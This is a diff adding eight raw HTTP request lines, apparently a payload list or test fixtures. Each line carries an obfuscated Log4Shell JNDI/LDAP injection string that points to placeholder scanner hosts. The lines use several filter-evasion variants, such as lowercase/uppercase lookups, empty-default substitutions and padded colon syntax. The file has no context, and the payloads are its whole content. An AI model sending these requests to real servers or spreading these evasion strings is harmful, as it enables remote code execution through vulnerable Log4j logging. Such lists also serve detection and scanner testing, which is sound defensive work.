@@ -1,0 +1,8 @@
+GET /?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://scanner-a.example/a} HTTP/1.1 Host: edge-a.example
+GET /?x=${${lower:jndi}:${lower:ldap}://scanner-b.example/a} HTTP/1.1 Host: edge-b.example
+GET /?x=${${lower:${lower:jndi}}:${lower:ldap}://scanner-c.example/a} HTTP/1.1 Host: edge-c.example
+GET /?x=${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://scanner-d.example/a} HTTP/1.1 Host: edge-d.example
+GET /?x=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p://scanner-e.example/a} HTTP/1.1 Host: edge-e.example
+GET /?x=${j${env:DOESNOTEXIST:-}ndi:ldap://scanner-f.example/a} HTTP/1.1 Host: edge-f.example
+GET /?x=${${: : : : ::: :: :: : :::-j}ndi:ldap://scanner-g.example/a} HTTP/1.1 Host: edge-g.example
+GET /?x=${${::::::::::::::-j}ndi:ldap://scanner-h.example/a} HTTP/1.1 Host: edge-h.example
